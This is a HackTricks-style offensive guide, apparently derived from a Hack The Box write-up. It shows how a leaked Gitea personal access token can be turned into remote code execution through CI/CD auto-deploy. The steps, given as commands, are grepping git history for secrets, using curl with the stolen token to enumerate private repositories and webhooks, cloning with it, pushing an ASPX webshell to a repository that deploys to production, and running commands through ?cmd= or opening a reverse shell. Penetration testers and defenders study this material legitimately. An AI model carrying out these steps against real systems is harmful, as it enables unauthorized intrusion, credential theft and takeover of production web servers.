# Abusing leaked PATs and CI/CD auto-deploy (repo write ➜ webroot RCE)

{{#include ../../banners/hacktricks-training.md}}

## Overview

- In Gitea, Personal Access Tokens (PATs) grant the same permissions as the user account. If a repository with write permissions is auto-deployed to a production web server, write access becomes arbitrary file write on the webroot, often leading directly to remote code execution (RCE).
- Typical pattern: attacker finds a leaked PAT in commit history or other source, authenticates to the Gitea API, enumerates private repositories, clones a repo that is auto-deployed, then commits a server-executable payload (for example, .aspx on IIS) to get RCE.

## Identify leaked tokens and interesting repos

- Check public repos and commit history for removed/semi-removed secrets:
  - Gitea UI: Explore ➜ Repositories, then browse commits/diffs for tokens, API keys, or code referencing env vars.
  - Git history locally: grep diffs/commits for keywords like token, secret, password.

```bash
git log -p | grep -niE 'token|secret|password|apikey|bearer'
# Inspect suspicious commit(s)
git show <commit>
```

- Authenticate to Gitea API with a leaked PAT to enumerate repos and contents:

```bash
PAT=REDACTED
BASE=http://<gitea_host>:3000

# Note: Both of these auth headers typically work in Gitea
curl -s "$BASE/api/v1/user" -H "Authorization: token $PAT" | jq .
curl -s "$BASE/api/v1/user" -H "Authorization: Bearer $PAT" | jq .

# List repos owned by the authenticated user or visible via org membership
curl -s "$BASE/api/v1/user/repos" -H "Authorization: Bearer $PAT" | jq -r '.[].full_name'

# List repo contents
OWNER=org_or_user
REPO=repo_name
curl -s "$BASE/api/v1/repos/$OWNER/$REPO/contents" -H "Authorization: Bearer $PAT" | jq -r '.[].name'

# Fetch and decode a file (API returns base64 for content)
curl -s "$BASE/api/v1/repos/$OWNER/$REPO/contents/README.md" \
  -H "Authorization: Bearer $PAT" | jq -r .content | base64 -d

# (Optional) Enumerate webhooks to spot auto-deploy integrations (requires appropriate repo perms)
curl -s "$BASE/api/v1/repos/$OWNER/$REPO/hooks" -H "Authorization: Bearer $PAT" | jq .
```

- Indicators of auto-deploy:
  - README/Docs mention changes are automatically deployed to a web server.
  - Presence of Gitea Actions workflows under .gitea/workflows/.
  - Webhooks/CI integration to a deployment service.

## Clone/push with a PAT

Avoid placing tokens in URLs when possible. Prefer setting an HTTP auth header for git:

```bash
PAT=REDACTED
BASE=http://<gitea_host>:3000
OWNER=org_or_user
REPO=repo_name

# Clone using an Authorization header (safer than token-in-URL)
git -c http.extraHeader="Authorization: Bearer $PAT" clone \
  "$BASE/$OWNER/$REPO.git"

cd "$REPO"
# Normal git operations (add/commit/push) will reuse the header for this remote
```

Alternatively, if needed, basic token-in-URL works but is noisy and may leak in logs/history:

```bash
git clone "http://$PAT@<gitea_host>:3000/$OWNER/$REPO.git"
```

## Weaponize auto-deploy ➜ IIS RCE via ASPX webshell

If the target is Windows IIS (ASP.NET), pushing an .aspx file typically lands under the served webroot after CI/CD completes.

```bash
# Example: copy in an ASPX webshell (choose your preferred one)
cp /path/to/webshell-LT.aspx shell.aspx

# Commit and push
git add shell.aspx
git commit -m "update"
# If git prompts to set identity, configure user.name and user.email, then commit again
git push
```

After the pipeline/webhook deploys, browse to the new file on the site, for example:

```
http://<target_site>/shell.aspx
```

From there you can execute commands (e.g., ?cmd=whoami) or trigger a reverse shell.

Notes and variations:
- If the production stack is different, adapt the payload:
  - Apache/PHP: drop a .php webshell
  - Tomcat/Java: drop a .jsp webshell
  - Node/other stacks: drop/modify code files that execute on request
- Branch protections or selective deploy rules may apply; push to the branch that the deploy system watches, or abuse the pipeline definition itself (see PPE techniques).

## Common pitfalls and tips

- PAT scopes: Gitea PATs currently behave like full-account tokens. If the user can push to the repo, the PAT can too.
- Headers: Gitea commonly accepts both Authorization: token <PAT> and Authorization: Bearer <PAT> for API calls.
- Secrets hygiene: Do not print tokens in your terminal history; prefer headers over token-in-URL for git.
- Discovery: Even if a token was later “removed” in a commit, it may remain in history. Always inspect diffs and prior commits.

## End-to-end example flow

1) Find leaked PAT in commit history or public code.
2) Use the PAT to enumerate repos and find one with CI/CD auto-deploy to production.
3) Clone repo with PAT and push a server-executable payload (e.g., .aspx) to the monitored branch.
4) Wait for deploy and access the payload on the production web server.
5) Use the webshell to gather creds or launch a reverse shell for interactive RCE.

## References

- 0xdf: HTB Lock – Gitea token leak to IIS RCE, mRemoteNG pivot, PDF24 repair → SYSTEM: https://0xdf.gitlab.io/2025/08/21/htb-lock.html
- Gitea API Swagger: https://try.gitea.io/api/swagger
- ASPX webshell reference (example collection): https://github.com/grov/webshell

{{#include ../../banners/hacktricks-training.md}}